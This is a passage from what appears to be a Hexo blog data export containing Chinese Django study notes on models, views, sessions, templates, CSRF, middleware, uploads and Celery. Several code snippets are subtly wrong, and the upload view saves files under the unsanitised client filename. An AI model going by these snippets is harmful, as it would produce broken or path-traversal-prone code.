Cookie（多用于记住用户名）\n```\nCookie的设置:需要一个HttpResponse的对象或者他的子类的对象，set_cookie\n取出cookie:request对象的COOKIES中\n\n设置:\n    xxx  =  HttpResponse() 实例化HttpResponse的对象\n    xxx.set_cookie('key',value,max_age = x) max_age是这只cookie的生存周期的，单位为秒\n    xxx.set_cookie('key2',value2,max_age = x)\n    return xxx\n取出:\n    xxx = request.COOKIES['key']\n    return HttpResponse(xxx)\n\n```\n### session(多用于银行卡,登录状态)\n```\nsession是一个特殊的Cookie,他的安全性更高，只给浏览器一个cookie编号,更重要的是，session可以记住用户的登录状态\n\n读取设置都在request\n设置session:\n    request.session['key'] = value\n    request.session['key2'] = value2\n    request.set_expiry(xx) 设置存活时间，整数，秒\n    return HttpResponse(request)\n\n获取:\n    xxx = request.session['xx']\n    xxx = request.session['xx']\n    xxx = request.session.get('xx')\n    return HttpResponse(xx)\n登录状态:\n    判断有没有这个键:request.session.has_key['']\n\n```\n\n\n## 第三块:模板templates\n```\nhtml里面的模板标签:\n    `{{变量}}`\n    `{% xx %}`  ` {% endxx %}`\n    {# 注释内容 #}\n   ` {% comment %}` 多行注释 `{% endcomment %}`\n\n过滤器:\n    格式: 模板变量 | 过滤器:参数\n    date:改变日期的显示格式\n    length:求字符串和列表的长度\n    default:设置不符合要求时候的默认值\n\n自定义过滤器:\n    在应用下创建一个templatetags包\n    在templatetags中创建过滤器xxx.py\n    在xxx.py中导入 from django.template import Library\n    实例化Library对象，xx = Library()\n    定义一个函数，和python一样的，有返回值的\n    装饰一下，@xx.xxx\n\n    在html中加载，在最前面:`{% load xxx %}`\n    使用过滤器:变量 | xx\n    如果xx函数中有参数，竖线前面的变量就是参数，如果有两个以上的参数那么只用传n-1个参数\n\n模板继承:\n    被继承的html模板不动，在子html模板中删除html代码，只写一句`{% extends '父模板地址' %}` 地址相对于templates\n\n    在父模板中预留位置:子模板就可以重写父模板中预留的位置，从而保证有些不同 在父模板中`{% block 块名 %}` 可以写可以不写 `{% endblock 块名 %}`，子模板中也写`{% block 块名 %} `可以写可以不写 `{% endblock 块名 %}`，两边的两个标签需要一样块名一样，内容可以不一样\n    既要使用父模板中的预留内容，也要自定义预留内容:`{% block 块名 %}` `{{ block.super }}`可以写可以不写 `{% endblock 块名 %}`\n\n    html转义:\n        在views.py 中render(request,'html 路径', {'content':'<h1>hello</h1>'})\n        这样传过去的用的时候{{content}}，html并不会把传过来的<h1>当作标签，而是转义成了字符\n        解决方法:\n            {{ content | safe }}\n\ncsrf伪造攻击:\n    主要原因:\n        1、你在正常登录网站之后，浏览器保存了你的sessionid,而且你并没有退出\n        2、在没有退出的情况下，访问了其他的网站做了一些不好的操作，间接的修改你的密码\n    django默认启用了csrf防护，并且只针对post提交的数据防护，并且对包括自己的所有人防护\n    解决办法:\n        在html文件中有post提交的表单下方第一行输入`{% csrf_token %}`这样自己就可以正常使用了\n\n验证码(防止暴力请求):\n    用闭包的方式验证登录，有些界面只有登陆了才能使用\n    工作的时候网上取down\n\n\nurl 反向解析(给地址取个名字,然后直接用地址就可以动态的生成网页地址，不管网页地址怎么变化):\n    在项目中的urls中的链接应用url地址的地方添加第三个参数:url(r'^', include('应用文件夹.urls'), namespace='应用文件夹名字')  ,namespace='一般用应用名,也可以自定义'\n    然后给应用中urls中的每一个自定义的链接取名:url(r'^xxx$',views.xx, name = '取名')\n\n    在html中使用:\n        1、<a href =` {% url 'namespace:name' %}`  url地址中没有参数  url(r'^xx$', views.xx, name = 'name')\n        2、<a href =` {% url 'namespace:name' 1%}`  url地址中有一个参数   url(r'^xx/(\\d+)$', views.xx, name = 'name')\n        3、<a href = `{% url 'namespace:name' 1 3%} ` url地址中有两个参数   url(r'^xx/(\\d+)/(\\d+)$', views.xx, name = 'name')\n        *4、<a href = `{% url 'namespace:name' a=1 b=3%}`  url地址中有两个被取名的参数   url(r'^xx/(?P<a>\\d+)/(?P<b>\\d+)$', views.xx, name = 'name')\n    在views中使用:\n        from django.core.urlresolvers import reverse\n        1、reverse('namespace:name') url地址中没有参数  url(r'^xx$', views.xx, name = 'name')\n        2、reverse('namespace:name', args = (1)) url地址中有一个参数   url(r'^xx/(\\d+)$', views.xx, name = 'name')\n        3、reverse('namespace:name', args = (1,3) url地址中有两个参数   url(r'^xx/(\\d+)/(\\d+)$', views.xx, name = 'name')\n        *4、reverse('namespace:name', kwargs = {'a':1, 'b':2}) url地址中有两个被取名的参数   url(r'^xx/(?P<a>\\d+)/(?P<b>\\d+)$', views.xx, name = 'name')\n```\n\n### 静态文件(css\\js\\image)\n```\n在项目文件夹中创建static文件夹\n在setting中配置:\n    STATIC_URL = '/定义网址以什么开头/'  一般都是static\n        这里的名字如果想要随便改，然后在html中动态生成的话，在html中加载 `{% load staticfiles %} ` 在要使用的地方用`{% static '文件路径' %}`这样进行拼接\n    STATICFILES_DIR = [拼接文件夹位置]\n静态文件的使用实在html中的链接\n```\n###    中间件\n```\n1、获取浏览器端的ip地址: request.META['REMOTE_ADDR'],可以设置某些ip访问网站\n2、中间件的左右就是在每一个视图函数调用之前都会先执行中间件，可以判断某些用户或者界面不能使用，如判断是否登录，判断ip是否被禁止\n3、定义中间件的方法:\n    在应用中新建一个middleware.py 的python文件\n    中间件的构成:\n        class xxxx(object):   中间件类\n            xxx\n            def process_view(self, request, view_func, *view_args, **view_kwargs)  中间件函数\n                xxx\n                return xxx\n4、定义了中间件以后，我们需要在setting中注册：找到MIDDLEWARE_CLASSES，然后'应用名.middleware.中间类\n5、中间件函数是内置的，只能使用内置的那么几个:\n    process_view(self, request, view_func, *view_args, **view_kwargs) : url匹配之后，视图调用之前\n    process_request(self, request) : 产生request对象之后， url匹配之前调用\n    __init__(self) : 服务器响应第一个请求的时候调用\n    process_response(self, request, response) : 视图调用之后，内容返回浏览器之前,需要return response\n    process_exception(self, request, exception) : 视图函数出现异常的时候调用，如果有多个exception，则按照注册的从后往前执行\n```\n\n## 第四模块Admin后台管理\n```\n1、创建用户:python manage.py createsuperuser\n2、登录用户:网址/admin\n3、注册模型类:在models.py中定义模型（将数据库中的数据加载到后台管理页面），在admin.py中去注册这个模型，admin.site.register(模型名字)\n\n\n上传图片:\n    在static文件夹中新建一个media文件夹，用于保存用户的头像等\n    在setting中设置MEDIA_ROOT = 拼接文件夹,MEDIA_URL = '/media/'\n\n    后台管理界面上传图片:创建一个数据库模型，定义一个字段，类型为ImageField(upload_to = 'media中的某个文件夹')\n\n浏览器上传的照片:\n    表单的提交方式和编码方式必须如下\n    <form method=\"post\" enctype=\"multipart/form-data\" action=\"/upload_down\">\n        `{% csrf_token %}`\n        <input type=\"file\" name=\"pic\"><br/>\n        <input type=\"submit\" value=\"上传\">\n    </form>\n        读取照片页面信息并保存：\n    def upload(request):\n        return render(request, 'upload.html')\n\n\n    def upload_down(request):\n        pic = request.FILES['pic']\n        pic_path = f'{settings.MEDIA_ROOT}/user_admin/{pic.name}'\n        with open(pic_path, 'wb') as pf:\n        for content in pic.chunks():\n            pf.write(content)\n        PicInfo.objects.create(pic_super=f'user_admin{pic.name}')\n        return HttpResponse('ok')\n浏览器上传的图片：\n    pic = request.FILES['xx']的对象：pic.name获取文件名,pic.chunks()分块读取内容进行保存，pic.size获取上传文件的大小都是常用的\n\n\n\n分页（ 在view.py中和html代码中使用）:\n    需要包：from django.core.paginator import Paginator\n    Paginator属性:num_pages:返回分页的总页数,page_range:返回分页的页码列表\n    Paginator方法:page(self,number)：返回低number页的Page实例对象\n    Page的属性:number:返回当前页的页码，object_list：返回包含当前页的数据的查询集，paginator:返回对应的Paginator对象\n    page的方法:has_previous:判断是否有前一页,has_next:判断是否有下一页,previous_page_number:放回前一页,next_page_unmber:返回下一页\n\n```\n\n## 第五模块(url匹配)\n\n```\n可以用path，url\nfrom django.urls import path,include或者from django.conf.urls import url,include\n在project的urls.py中，使用反向解析用到include,在include中添加参数namespace空间命名，可以进行反向解析，在应用中的urls.py中的urlpatterns上面添加一句app_name='xx'这个名字和namespace的名字相同。\n在应用的urls.py中，想使用反向解析，不需要include,可以直接在最后添加参数，name='xx'\n```\n\n\n\n\n## 数据加密\n```\npip install itsdangerous\nfrom itsdangerous import TimedJSONWebSignatureSerializer\n创建一个TimedJSONWebSignatureSerializer对象: xx = TimedJSONWebSignatureSerializer('加密秘钥'，过期时间)\n\n加密：加密结果 = TimedJSONWebSignatureSerializer对象.dumps(数据)\n解密: 解密结果 = TimedJSONWebSignatureSerializer对象.loads(加密结果)\n```\n\n## 异步发邮件\n```\npip install celery\n项目中新建一个任务包，在这个包中使用celery（from celery import Celery）\n创建Celery的实例对象：xx = Celery('名字'，broker='redis://127.0.0.1:6379/1'),broker代表中间人\n定义需要异步处理的函数，用@xx.task装饰\n在需要用到异步处理的应用中使用：\n    导入过来的函数.delay(参数)\n再将整个项目复制一份，进入复制的项目中的celery的包中：\n    import os\n    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'dalifresh.settings')\n    django.setup()\n然后再终端输入命令:celery -A 取好的名字 worker -l info来运行这个异步处理\n```","source":"_posts/Django基础.md","raw":"---\ntitle: Django基础\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-01-19 15:42:38\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: django学习笔记\ntags: django\ncategories: Python\n---\n## Django\n### 创建项目\ndjango-admin startproject 项目名\n\n### 创建应用\npython manage.py startapp 应用名\n### 运行web服务器\npython manage.py runserver\n\n\n\n\n```python\npython3 -m http.server [port] # 可以启动一个web服务，供局域网内用户下载文件\n```\n\n### 将固定的路径加入python可以搜索的目录\nimport sys\n\nsys.path.insert(位置（从0开始），要加入搜索的目录)\n```python\npython manage.py shell # 进入django终端\n```\n### ORM框架\n-    1、对象和数据库映射\n-    2、根据设计的模型生成数据库中的表:\n    -  1、生长牵引文件:python manage.py makemigrations\n    - 2、执行牵引文件:python manage.py migrate\n\n### 模型类\n> 在models.py中编写模型类\n\n  -  1、生长迁移文件:python manage.py makemigrations\n    -    注意如果有ForeignKey的话一定要加上on_delete = models.CASCADE\n  - 2、执行迁移文件:python manage.py migrate\n    \n> python manage.py shell\n```text\n首先:导入定义好的模型类\n其次:实例化一个对象\n插入 :对象.属性名=值\n保存:对像.save()\n拿到数据:变量 = 类名.objects.get(条件)\n    变量.属性：直接查看\n    变量.属性=值  ——> 变量.save()  :修改\n    变量.delete():删除\n```\n\n### 后台管理（在admin.py中编写后台管理类）\n```\n本地化: LANGUAGE_CODE = 'zh-hans' :使用中文\n       TIME_ZONE = 'Asia/Shanghai' :使用中国时间\n\n创建管理员:python manage.py createsuperuser   (第一次新建管理员的时候必须要执行一下牵引文件，可以不生成，但必须执行)\n\n自己创建的管理员是默认是放在数据库中的一个单独的表中的，但是可以使用（在settings.py中）：\n# django认证系统使用的模型类\nAUTH_USER_MODEL='应用.类名'\n\n这个来规定生成数据放在什么表，在实际开发中是特别的重要的，一般和用户信息放在一起\n\n使用这个必须导入(models.py中)from django.contrib.auth.models import AbstractUser\n\n加入自己定义的数据库或者数据库模型: 1、导入 2、admin.site.register(类)\n\n规定自定义的数据库或者数据库模型的显示: list_display('','')\n```\n\n### 使用视图（在views中编写）\n```\n使用模块: from django.http import HttpResponse,HttpResponseRedirect(重定向)\n使用模块: from django.shortcuts import render,redirect(也是重定向)\n使用 return HttpResponse('返回值') 返回结果\n使用模块: from django.conf.urls import include, url\nurl的使用方法:url(r'正则表达式',处理字符串)\n            url(r'正则表达式',include(处理源))\n\n实现过程: views.py 中创建视图（使用模块第一个） --->  创建 urls.py (使用第二个模块,并且导入views.py)  --->  项目中的urls.py\n中添加创建的urls.py(使用url添加)\n```\n\n\n### 模板（项目文件夹中创建 模板文件夹templates）\n```\n在项目文件夹中的setting中设置TEMPLATES中的DIRS，表示模板位置，一般拼接\n使用模板:\n    导入模块:from django.template import loader\n    1、使用模板文件: temp = loader.get_template('文件名可以带路径')\n    2、定义上下文（个模板传参数）: context = {字典参数}\n    3、渲染模板:产生HTML代码:res_html = temp.render(context)\n    4、返回浏览器:return HttpResponse(res_html)\n\n最简单的使用方法: return render(request,'文件可以带路径',{传参数})\n\n参数在html代码中的使用方法:\n    普通变量:{{key}}\n    for循环:{% fro x in xx %}\n            {%endfor%}\n\n```\n\n## 关于django和数据库的操作\n```\n1、创models文件 class xxx(models.Model)\n2、迁移文件\n3、创建views文件 def xxx(request)，必须有返回值,一般返回值用HttpResponse,使用模板的返回值用render,需要重定向的话使用redirect\n4、新建应用urls.py文件,用于定义访问时用的url地址\n5、取项目中的urls文件中添加应用的url文件 ：url(r'^',include(xxx.urls))\n6、在项目中创建templates模板文件,在到seting中配置一下，templates中的文件就是html文档\n```\n\n\n### 第一大点:models,模型,注册模型类\ndjango操作数据库的相关知识\n```\n应用下的models.py文件中定义的所有模型，都要继承一个抽象基类:\n创建抽象基类:在项目中创建一个pythonPakage,名字叫db,在这个包下面创建一个base_model.py文件，在文件中编写一个抽像基类\n```\n```python\nfrom django.db import models\nclass BaseModel(models.Model):\n        '''模型抽象基类'''\n        create_time = models.DateTimeField(auto_now_add=True, verbose_name='创建时间')\n    update_time = models.DateTimeField(auto_now=True, verbose_name='更新时间')\n        is_delete = models.BooleanField(default=False, verbose_name='删除标记')\n    class Meta:\n        '''说明是一个抽象模型类'''\n        abstract = True\n```\n\n #####   约束选项在字段类型中使用，字段类型在models模块下使用\n字段类型:\n```\n1、AutoField:自动编号\n2、BooleanField:布尔类型\n3、NullBooleanField:Null，True，False三种值\n4、CharField（max_length=）:字符串,必须指定max_length\n5、TextField:大文本类型\n6、IntegerField:整数\n7、DecimalField(max_digits=,decimal_places=):浮点数，第一个参数表示总位数，第二个参数表示小数位数\n8、FloatField(max_digits=,decimal_places=):浮点数，参数同上\n9、DateField（[auto_now=,auto_now_add=]）:日期类型，有两个可选参数，用的时候只能用一个，第一个表示更新时间，第二个表示第一次创建的的时间\n10、TimeField（[auto_now=,auto_now_add=]）:时分秒\n11、DateTimeField（[auto_now=,auto_now_add=]）:年月日时分秒\n12、FileField:文件上传\n13、ImageField:有效图片\n\n14、ForeignKey:一对多\n15、ManyToManyField:多对多\n16、OneToOneField:一对一\n\n约束选项:\n1、default:默认值\n2、primary_key:主键\n3、unique:不重复\n4、db_index:索引，db_index=True/False\n5、db_column:指定表字段的名字，db_column='名字'\n6、null:空\n7、blank:是否为空，在后台使用，默认True，在django管理页面有用\n8、chioces：chioces选项,等于一个元组，格式 choices = ((xx,xxx),(xx,xxx)……),网页显示为一个列表框\n9、verbose_name：制定在后台的显示名称 ，字段和表名都可以用\n```\n#### 富文本\n```\ndjango使用tinymce：\n    pip install django-tinymce\n    from tinymce.models import HTMLField\n    xx = HTMLField(verbose_name = 'xx')\n    在settings.py中注册这个富文本编辑器，INSTALLED_APPS中添加tinymce\n    在settings.py中设置富文本编辑器的属性：\n        TINYMCE_DEFAULT_CONFIG = {\n            'theme': 'advanced',\n            'width': 编辑器的宽,\n            'height': 编辑器的高,\n        }\n    在项目urls中添加: url(r'^tinymce/', include('tinymce.urls'))\n\n```\n####\t查询\n```\n说明一下:exclude,filter,get三个都时带条件的--->模型名.objects.查询方式(属性名__条件名=值)\n条件名:\nexact:判等 ，可以不用直接用 =\ncontains:模糊查询，包含\nendswith\\startswith:模糊查询，结尾\\开头\nisnull:空查询,布尔值\nin:范围查询，属性名__in = 列表或者元组\ngt,lt,gte,lte:大于，小于，大于等于，小于等于\nday/month/year:使用方法:日期查询\n\nget():返回满足条件的一条记录\nall():返回所有记录，查询集\nfilter():返回满足条件的所有记录，查询集\nexclude():返回不满足条件的所有记录，查询集\norder_by(‘属性名1’,’属性名2'……):升序\norder_by(‘-属性名1’,’-属性名2'……):降序，order_by()是将查出来的数据进行排序，如：BookInfo.objects.all().order_by('id','-btitle')\n\n\nQ对象:用于查询时候的多个条件的  ’与或非‘  表示\n    from django.db.models import Q\n    例子:\n        BookInfo.object.filter(Q(id = 2) & Q(btitle = 'hello'))   与\n        BookInfo.object.filter(Q(id = 2) | Q(btitle = 'hello'))   或\n        BookInfo.object.filter(~Q(id = 2))                        非\nF对象:条件中用于属性比较,还可以进行算数运算\n    from django.db.models import F\n    例子:\n        BookInfo.objects.filter(id__gt = F('bid'))\n        BookInfo.objects.filter(id__gt = F('bid')*3)\n\n\n\n聚合函数:sum,count,avg,max,min,在django中通过aggregates来使用\n    from django.db.models import Sum,Count,Avg,Max,Min\n    例子:\n        BookInfo.objects.all().aggregate(Count('id')) : 返回值是字典\n        BookInfo.objects.all().aggregate(Sum('bread') : 总和\n\n\n插入、更新、删除:\n    save():插入更新\n    delete():删除\n\n关联查询:\n    一对多:对象.多类的名字__set.all()\n    多对一:对象.关系属性\n\n\n模型管理器:\n    也是在models中编写，\n    格式:\n        class xxx (models.Manager):\n            可以定义方法或者定义查询（all）\n\n\n元选项(指定表名):\n    class Meta:\n        db_table = 'xxx'\n    verbose_name = 'xxx'\n    verbose_name_plural = verbose_name\n    每个需要自定义表名的模型下方都要写这个代码，否则用系统给的表明,后两行代码代表指定在后台显示什么名字\n```\n\n\n\n\n## 第二大点:views,视图的使用\n```\n1、项目中的urls中加入应用中的urls中的所有，表示项目启动以后可以使用应用的链接配置\n2、应用中的urls用于配置浏览器页面输入的地址，一般只配置‘/’以后的\n3、编写views文件，写清楚每个url的动作，定义在函数中,需要返回值\n\n4、views文件中所写的代码就是写应该在网页中现实的东西\n5、如果要使用模板，需要在项目文件夹下创建一个templates文件夹，并且配置好路径\n\n6、return HttpResponse(xx),不用模板\n   return HttpResponseRedirect(地址),redirect(地址)，两个功能一样都是重定向，在数据库添加后及时显示时候用\n   return render(request, '模板文件位置',{参数})\n\n重点:关于数据库的操作:导入 models  (类)\n    关于网页内容操作:导入 views   (函数)\n\nseting 中的设置，要改一起改\n    setting 中的DEBUG属性(调试模式):默认是True，改成False后可以显示标准的报错页面\n    setting 中的ALLOWED_HOSTS属性(允许访问):默认注释了的，是一个列表，ALLOWED_HOSTS = ['*']表示所有用户都可访问\n\n给视图传参数: 在urls中配置url的时候，给一个正则的分组就表示给视图传参数:\n            第一种:直接分组:views中的形参可以随便定义 :url(r'^index(\\d+)$',views.show)-->def show(request,a)\n            第二种:分组命名:views长的形参必须和分组的名字一致  :url(r'^index(?p<num>\\d+)$',views.show)-->def show(request,num)\nrequest参数:\n    def index (request)中使用,躲在用于登陆的时候使用\n        request.POST:保存的是网页中用post方式提交的参数，参数保存在请求头中\n        request.GET:保存的是网页中用get方式提交的参数，参数保存在url中\n    使用方法:\n        xx = request.POST.get('xxx')\n        xx = request.GET.get('xxx')\n\n\n 重点:\n    如果是网页模板，那么需要创建一个templates文件夹在项目文件夹下并且setting中配置路径，上面也提到过\n    如果是静态的文件，js，css，image这些文件的话，需要在项目文件夹下创建一个static文件夹，平且在setting中配置STATIC_URL = '/static/' 和 STATICFILES_DIR = [os.path.join(BASE_DIR,'刚刚创建的文件夹static')]\n```\n\n### Cookie（多用于记住用户名）\n```\nCookie的设置:需要一个HttpResponse的对象或者他的子类的对象，set_cookie\n取出cookie:request对象的COOKIES中\n\n设置:\n    xxx  =  HttpResponse() 实例化HttpResponse的对象\n    xxx.set_cookie('key',value,max_age = x) max_age是这只cookie的生存周期的，单位为秒\n    xxx.set_cookie('key2',value2,max_age = x)\n    return xxx\n取出:\n    xxx = request.COOKIES['key']\n    return HttpResponse(xxx)\n\n```\n### session(多用于银行卡,登录状态)\n```\nsession是一个特殊的Cookie,他的安全性更高，只给浏览器一个cookie编号,更重要的是，session可以记住用户的登录状态\n\n读取设置都在request\n设置session:\n    request.session['key'] = value\n    request.session['key2'] = value2\n    request.set_expiry(xx) 设置存活时间，整数，秒\n    return HttpResponse(request)\n\n获取:\n    xxx = request.session['xx']\n    xxx = request.session['xx']\n    xxx = request.session.get('xx')\n    return HttpResponse(xx)\n登录状态:\n    判断有没有这个键:request.session.has_key['']\n\n```\n\n\n## 第三块:模板templates\n```\nhtml里面的模板标签:\n    `{{变量}}`\n    `{% xx %}`  ` {% endxx %}`\n    {# 注释内容 #}\n   ` {% comment %}` 多行注释 `{% endcomment %}`\n\n过滤器:\n    格式: 模板变量 | 过滤器:参数\n    date:改变日期的显示格式\n    length:求字符串和列表的长度\n    default:设置不符合要求时候的默认值\n\n自定义过滤器:\n    在应用下创建一个templatetags包\n    在templatetags中创建过滤器xxx.py\n    在xxx.py中导入 from django.template import Library\n    实例化Library对象，xx = Library()\n    定义一个函数，和python一样的，有返回值的\n    装饰一下，@xx.xxx\n\n    在html中加载，在最前面:`{% load xxx %}`\n    使用过滤器:变量 | xx\n    如果xx函数中有参数，竖线前面的变量就是参数，如果有两个以上的参数那么只用传n-1个参数\n\n模板继承:\n    被继承的html模板不动，在子html模板中删除html代码，只写一句`{% extends '父模板地址' %}` 地址相对于templates\n\n    在父模板中预留位置:子模板就可以重写父模板中预留的位置，从而保证有些不同 在父模板中`{% block 块名 %}` 可以写可以不写 `{% endblock 块名 %}`，子模板中也写`{% block 块名 %} `可以写可以不写 `{% endblock 块名 %}`，两边的两个标签需要一样块名一样，内容可以不一样\n    既要使用父模板中的预留内容，也要自定义预留内容:`{% block 块名 %}` `{{ block.super }}`可以写可以不写 `{% endblock 块名 %}`\n\n    html转义:\n        在views.py 中render(request,'html 路径', {'content':'<h1>hello</h1>'})\n        这样传过去的用的时候{{content}}，html并不会把传过来的<h1>当作标签，而是转义成了字符\n        解决方法:\n            {{ content | safe }}\n\ncsrf伪造攻击:\n    主要原因:\n        1、你在正常登录网站之后，浏览器保存了你的sessionid,而且你并没有退出\n        2、在没有退出的情况下，访问了其他的网站做了一些不好的操作，间接的修改你的密码\n    django默认启用了csrf防护，并且只针对post提交的数据防护，并且对包括自己的所有人防护\n    解决办法:\n        在html文件中有post提交的表单下方第一行输入`{% csrf_token %}`这样自己就可以正常使用了\n\n验证码(防止暴力请求):\n    用闭包的方式验证登录，有些界面只有登陆了才能使用\n    工作的时候网上取down\n\n\nurl 反向解析(给地址取个名字,然后直接用地址就可以动态的生成网页地址，不管网页地址怎么变化):\n    在项目中的urls中的链接应用url地址的地方添加第三个参数:url(r'^', include('应用文件夹.urls'), namespace='应用文件夹名字')  ,namespace='一般用应用名,也可以自定义'\n    然后给应用中urls中的每一个自定义的链接取名:url(r'^xxx$',views.xx, name = '取名')\n\n    在html中使用:\n        1、<a href =` {% url 'namespace:name' %}`  url地址中没有参数  url(r'^xx$', views.xx, name = 'name')\n        2、<a href =` {% url 'namespace:name' 1%}`  url地址中有一个参数   url(r'^xx/(\\d+)$', views.xx, name = 'name')\n        3、<a href = `{% url 'namespace:name' 1 3%} ` url地址中有两个参数   url(r'^xx/(\\d+)/(\\d+)$', views.xx, name = 'name')\n        *4、<a href = `{% url 'namespace:name' a=1 b=3%}`  url地址中有两个被取名的参数   url(r'^xx/(?P<a>\\d+)/(?P<b>\\d+)$', views.xx, name = 'name')\n    在views中使用:\n        from django.core.urlresolvers import reverse\n        1、reverse('namespace:name') url地址中没有参数  url(r'^xx$', views.xx, name = 'name')\n        2、reverse('namespace:name', args = (1)) url地址中有一个参数   url(r'^xx/(\\d+)$', views.xx, name = 'name')\n        3、reverse('namespace:name', args = (1,3) url地址中有两个参数   url(r'^xx/(\\d+)/(\\d+)$', views.xx, name = 'name')\n        *4、reverse('namespace:name', kwargs = {'a':1, 'b':2}) url地址中有两个被取名的参数   url(r'^xx/(?P<a>\\d+)/(?P<b>\\d+)$', views.xx, name = 'name')\n```\n\n### 静态文件(css\\js\\image)\n```\n在项目文件夹中创建static文件夹\n在setting中配置:\n    STATIC_URL = '/定义网址以什么开头/'  一般都是static\n        这里的名字如果想要随便改，然后在html中动态生成的话，在html中加载 `{% load staticfiles %} ` 在要使用的地方用`{% static '文件路径' %}`这样进行拼接\n    STATICFILES_DIR = [拼接文件夹位置]\n静态文件的使用实在html中的链接\n```\n###    中间件\n```\n1、获取浏览器端的ip地址: request.META['REMOTE_ADDR'],可以设置某些ip访问网站\n2、中间件的左右就是在每一个视图函数调用之前都会先执行中间件，可以判断某些用户或者界面不能使用，如判断是否登录，判断ip是否被禁止\n3、定义中间件的方法:\n    在应用中新建一个middleware.py 的python文件\n    中间件的构成:\n        class xxxx(object):   中间件类\n            xxx\n            def process_view(self, request, view_func, *view_args, **view_kwargs)  中间件函数\n                xxx\n                return xxx\n4、定义了中间件以后，我们需要在setting中注册：找到MIDDLEWARE_CLASSES，然后'应用名.middleware.中间类\n5、中间件函数是内置的，只能使用内置的那么几个:\n    process_view(self, request, view_func, *view_args, **view_kwargs) : url匹配之后，视图调用之前\n    process_request(self, request) : 产生request对象之后， url匹配之前调用\n    __init__(self) : 服务器响应第一个请求的时候调用\n    process_response(self, request, response) : 视图调用之后，内容返回浏览器之前,需要return response\n    process_exception(self, request, exception) : 视图函数出现异常的时候调用，如果有多个exception，则按照注册的从后往前执行\n```\n\n## 第四模块Admin后台管理\n```\n1、创建用户:python manage.py createsuperuser\n2、登录用户:网址/admin\n3、注册模型类:在models.py中定义模型（将数据库中的数据加载到后台管理页面），在admin.py中去注册这个模型，admin.site.register(模型名字)\n\n\n上传图片:\n    在static文件夹中新建一个media文件夹，用于保存用户的头像等\n    在setting中设置MEDIA_ROOT = 拼接文件夹,MEDIA_URL = '/media/'\n\n    后台管理界面上传图片:创建一个数据库模型，定义一个字段，类型为ImageField(upload_to = 'media中的某个文件夹')\n\n浏览器上传的照片:\n    表单的提交方式和编码方式必须如下\n    <form method=\"post\" enctype=\"multipart/form-data\" action=\"/upload_down\">\n        `{% csrf_token %}`\n        <input type=\"file\" name=\"pic\"><br/>\n        <input type=\"submit\" value=\"上传\">\n    </form>\n        读取照片页面信息并保存：\n    def upload(request):\n        return render(request, 'upload.html')\n\n\n    def upload_down(request):\n        pic = request.FILES['pic']\n        pic_path = f'{settings.MEDIA_ROOT}/user_admin/{pic.name}'\n        with open(pic_path, 'wb') as pf:\n        for content in pic.chunks():\n            pf.write(content)\n        PicInfo.objects.create(pic_super=f'user_admin{pic.name}')\n        return HttpResponse('ok')\n浏览器上传的图片：\n    pic = request.FILES['xx']的对象：pic.name获取文件名,pic.chunks()分块读取内容进行保存，pic.size获取上传文件的大小都是常用的\n\n\n\n分页（ 在view.py中和html代码中使用）:\n    需要包：from django.core.paginator import Paginator\n    Paginator属性:num_pages:返回分页的总页数,page_range:返回分页的页码列表\n    Paginator方法:page(self,number)：返回低number页的Page实例对象\n    Page的属性:number:返回当前页的页码，object_list：返回包含当前页的数据的查询集，paginator:返回对应的Paginator对象\n    page的方法:has_previous:判断是否有前一页,has_next:判断是否有下一页,previous_page_number:放回前一页,next_page_unmber:返回下一页\n\n```\n\n## 第五模块(url匹配)\n\n```\n可以用path，url\nfrom django.urls import path,include或者from django.conf.urls import url,include\n在project的urls.py中，使用反向解析用到include,在include中添加参数namespace空间命名，可以进行反向解析，在应用中的urls.py中的urlpatterns上面添加一句app_name='xx'这个名字和namespace的名字相同。\n在应用的urls.py中，想使用反向解析，不需要include,可以直接在最后添加参数，name='xx'\n```\n\n\n\n\n## 数据加密\n```\npip install itsdangerous\nfrom itsdangerous import TimedJSONWebSignatureSerializer\n创建一个TimedJSONWebSignatureSerializer对象: xx = TimedJSONWebSignatureSerializer('加密秘钥'，过期时间)\n\n加密：加密结果 = TimedJSONWebSignatureSerializer对象.dumps(数据)\n解密: 解密结果 = TimedJSONWebSignatureSerializer对象.loads(加密结果)\n```\n\n## 异步发邮件\n```\npip install celery\n项目中新建一个任务包，在这个包中使用celery（from celery import Celery）\n创建Celery的实例对象：xx = Celery('名字'，broker='redis://127.0.0.1:6379/1'),broker代表中间人\n定义需要异步处理的函数，用@xx.task装饰\n在需要用到异步处理的应用中使用：\n    导入过来的函数.delay(参数)\n再将整个项目复制一份，进入复制的项目中的celery的包中：\n    import os\n    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'dalifresh.settings')\n    django.setup()\n然后再终端输入命令:celery -A 取好的名字 worker -l info来运行这个异步处理\n```","slug":"Django基础","published":1,"updated":"2023-03-10T02:56:02.814Z","_id":"cld2uqf5u00001svk6huy2u4c","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"Django\"><a href=\"#Django\" class=\"headerlink\" title=\"Django\"></a>Django</h2><h3 id=\"创建项目\"><a href=\"#创建项目\" class=\"headerlink\" title=\"创建项目\"></a>创建项目</h3><p>django-admin startproject 项目名</p>\n<h3 id=\"创建应用\"><a href=\"#创建应用\" class=\"headerlink\" title=\"创建应用\"></a>创建应用</h3><p>python manage.py startapp 应用名</p>\n<h3 id=\"运行web服务器\"><a href=\"#运行web服务器\" class=\"headerlink\" title=\"运行web服务器\"></a>运行web服务器</h3><p>python manage.py runserver</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">python3 <span class=\"token operator\">-</span>m http<span class=\"token punctuation\">.</span>server <span class=\"token punctuation\">[</span>port<span class=\"token punctuation\">]</span> <span class=\"token comment\"># 可以启动一个web服务，供局域网内用户下载文件</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"将固定的路径加入python可以搜索的目录\"><a href=\"#将固定的路径加入python可以搜索的目录\" class=\"headerlink\" title=\"将固定的路径加入python可以搜索的目录\"></a>将固定的路径加入python可以搜索的目录</h3><p>import sys</p>\n<p>sys.path.insert(位置（从0开始），要加入搜索的目录)</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">python manage<span class=\"token punctuation\">.</span>py shell <span class=\"token comment\"># 进入django终端</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h3 id=\"ORM框架\"><a href=\"#ORM框架\" 